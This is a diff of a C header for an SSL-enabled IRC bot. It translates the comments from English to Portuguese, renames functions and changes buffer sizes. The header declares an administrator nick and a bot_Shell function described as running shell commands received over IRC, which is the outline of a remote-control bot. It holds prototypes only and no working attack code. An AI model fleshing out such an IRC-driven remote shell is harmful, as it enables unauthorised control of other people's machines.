@@ -1,12 +1,11 @@
 /*
 
-  Defines to ircbot,
-  and data for connection.
+  Definições de estrutura de dados e protótipos.
 
 */
 
 /* Bot art logo */
-char b_Brand[] = {
+char bot_Brand[] = {
   226, 150, 170, 32, 32, 226, 150, 132, 226, 150, 
   132, 226, 150, 132, 32, 32, 32, 226, 150, 132, 
   226, 150, 132, 194, 183, 32, 226, 150, 132, 226, 
@@ -34,65 +33,67 @@ char b_Brand[] = {
   226, 150, 128, 226, 150, 128, 32, 00
 };
 
-/* Bot Adm Nick */
+/* bot adm nick */
 #define BOT_ADM "stackiller"
 
-/* get size of pointer array */ 
+/* obtém o tamanho do ponteiro do array. */ 
 #define ARRAY_SIZE(x) ((sizeof(x)) / (sizeof(x[0])))
 
-/* IRC Struct data types */
+/* Estrutura de dados IRC */
 typedef struct {
-  SSL_CTX *ctx; // SSL context pointer
-  SSL *ssl; // ssl Descriptor
-  int sockfd; // socket file descriptor
-  char *host, *port; // host and port
-  char *nick, *pass; // nick and pass
-  char *chans, *buffer; // channels && buffer
+  SSL_CTX *ctx; // ponteiro de contexto ssl.
+  SSL *ssl; // descritor ssl.
+  int sockfd; // descrito do socket.
+  char *host, *port; // host e porta.
+  char *nick, *pass; // nick e pass.
+  char *chans, *buffer; // canais e buffer.
 } irc_d;
 
-/* Prototypes of Functions */
-SSL_CTX* init_Ctx(void);
+/* Protótipos das funções */
+SSL_CTX* init_Ctx(void); // inicializa um novo contexto ssl.
+void show_Certs(SSL*); // mostra os certificados ssl.
 
-int new_Conn(const char*, int); // create socket
-int b_Pong(char*);
-int str_Cmp(char*, char*); // compare two strings.
-int matrix_haveNull(char**, int);
+int new_Conn(const char*, int); // cria um socket.
 
-char* r_Buffer(void);
-char* str_Chr(char*, char); // split token, using ch.
-char* get_Dst(char*); // get channel of message.
-char* get_Msg(char*); // get message of buffer.
-char* get_Src(char*); // get host of message.
-char* get_nArg(char*, int); // get arguments of message.
-char* g_Args(char*); // get all arguments of message.
+int str_Cmp(char*, char*); // compara duas strings.
+int matrix_haveNull(char**, int); // checa se uma matriz tem algum elemento nulo.
+void matrix_Destroy(char **, int); // destrói uma matriz.
+void release(void *ptr); // libera um ponteiro.
 
-void matrix_Destroy(char **, int);
+char* r_Buffer(void); // lê o buffer.
+void msg_Send(char*); // envia uma mensagem para o servidor irc.
 
-void m_Send(char*);
-void show_Certs(SSL*);
-void b_Nick(char*);
-void b_Creds(char*, char*);
-void b_Join(char*);
-void bot_Priv(char*, char*);
-void bot_Part(char*);
-void bot_Shell(char*, char*);
-void p_Msg(char*, char*);
-int bot_Exec(char*, char*, char*); // controller bot commands.
-void b_Header(void);
-void usage(char*);
-void release(void *ptr);
+char* get_Dst(char*); // obtém o destinatário.
+char* get_Msg(char*); // obtém a mensagem.
+char* get_Src(char*); // obtém a origem.
+char* get_nArg(char*, int); // obtém n arg.
+char* get_Args(char*); // obtém todos os argumentos da mensagem.
 
-// Sizes
-#define BUFFER_SIZE 80000
-#define BUFFER_LINE_SIZE 4024
-#define B_LEN 50
+int bot_Exec(char*, char*, char*); // controla os comandos a serem executados pelo bot.
 
-// Error defines
+int bot_Pong(char*); // pong.
+void bot_Nick(char*); // nick.
+void bot_Creds(char*, char*); // credenciais.
+void bot_Join(char*); // join
+void bot_Priv(char*, char*); // privmsg
+void bot_Part(char*); // part.
+
+void bot_Shell(char*, char*); // executa comandos do shell.
+
+void bot_Header(void); // header do bot.
+void usage(char*); // modo de usar.
+
+// Tamanhos
+#define BUFFER_SIZE 512 * 11
+#define BUFFER_LINE_SIZE 512
+#define BOT_MAX_LEN 50
+
+// Erros
 #define FAIL -1
-#define FAIL_SOCK "[!] Failed to create socket. :("
-#define FAIL_CONN "[!] Failed to connect. :("
+#define FAIL_SOCK "[!] Falha ao criar o socket o__O"
+#define FAIL_CONN "[!] Falha na conexão, tente novamente :P"
 
-// Foreground Colors
+// Cores
 #define tRed "\e[91m"
 #define tGreen "\e[92m"
 #define tYellow "\e[93m"
